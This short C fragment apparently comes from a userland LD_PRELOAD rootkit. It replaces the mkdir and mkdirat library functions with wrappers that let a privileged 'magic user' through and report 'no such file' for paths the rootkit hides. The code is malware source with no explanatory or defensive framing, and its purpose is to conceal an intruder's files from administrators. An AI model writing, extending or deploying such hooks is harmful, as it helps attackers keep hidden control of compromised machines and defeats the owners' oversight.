int mkdir(const char *pathname, mode_t mode){
    hook(CMKDIR);
    if(magicusr()) return (long)call(CMKDIR, pathname, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CMKDIR, pathname, mode);
}
int mkdirat(int dirfd, const char *pathname, mode_t mode){
    hook(CMKDIRAT);
    if(magicusr()) return (long)call(CMKDIRAT, dirfd, pathname, mode);
    if(hidden_path(pathname) || hidden_fd(dirfd)) { errno = ENOENT; return -1; }
    return (long)call(CMKDIRAT, dirfd, pathname, mode);
}